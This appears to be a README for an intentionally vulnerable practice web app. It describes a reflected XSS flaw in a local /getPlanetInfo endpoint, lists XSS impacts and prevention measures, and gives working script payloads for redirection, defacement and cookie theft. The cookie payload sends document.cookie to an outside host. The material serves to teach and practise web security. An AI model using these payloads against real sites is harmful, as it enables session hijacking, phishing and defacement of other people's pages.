### This code is vulnerable to [XSS](https://portswigger.net/web-security/cross-site-scripting)

Vulnerable Endpoint: `/getPlanetInfo`

Exploit: 
```js
http://localhost:5000/getPlanetInfo?planet=<script>alert('XSS Attack')</script>
``` 

### What you can do with XSS?
- Steal Cookies and Session Information
- Redirect to malicious websites
- Modify website content
- Phishing
- Keylogging
- etc. 

### How to prevent XSS?
- Sanitize user input
- Use Content Security Policy (CSP)
- Use HttpOnly Cookies
- Use X-XSS-Protection header


### Here are some exploit examples:

#### Redirect to Phiting page using XSS 
```<script>   window.location.href = 'https://google.com'; </script>```

#### Get cookies 
```<script> window.location.href = 'https://google.com/?cookie=' + document.cookie; </script>```

#### Modify website content
You can inject any phising page / malicious page or any other content to the website using XSS.

```<script> document.body.innerHTML = '<h1>Website is hacked</h1>'; </script>```

 
```<iframe width="560" height="315" src="https://www.youtube.com/embed/dQw4w9WgXcQ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe> ```
 